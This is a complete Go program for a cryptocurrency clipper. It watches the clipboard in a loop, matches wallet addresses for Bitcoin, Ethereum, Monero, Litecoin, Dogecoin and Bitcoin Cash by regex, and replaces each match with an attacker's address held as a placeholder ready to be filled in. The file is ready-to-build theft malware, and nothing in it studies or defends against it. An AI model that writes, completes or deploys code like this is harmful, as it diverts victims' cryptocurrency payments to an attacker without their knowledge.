package main

import (
	"regexp"
	"time"

	"github.com/atotto/clipboard"
)

var addresses = map[string]string{
	"btc":  "BTCREPLACE",
	"eth":  "ETHREPLACE",
	"xmr":  "XMRREPLACE",
	"ltc":  "LTCREPLACE",
	"doge": "DOGEREPLACE",
	"bch":  "BCHREPLACE",
}

var regexes = map[string]string{
	"btc":  "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
	"eth":  "^0x[a-zA-F0-9]{40}$",
	"xmr":  "^4[0-9A-B].{93}$",
	"ltc":  "[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",
	"doge": "^D[A-Za-z0-9]{33}$",
	"bch":  "^[13][a-km-zA-HJ-NP-Z1-9]{25,39}$",
}

func main() {
	for {
		time.Sleep(600 * time.Millisecond)

		clipboardContent, err := clipboard.ReadAll()
		if err != nil {
			panic(err)
		}

		for coin, regex := range regexes {
			match, _ := regexp.MatchString(regex, clipboardContent)
			if match {
				replacementAddress := addresses[coin]
				clipboard.WriteAll(replacementAddress)
				break
			}
		}
	}
}
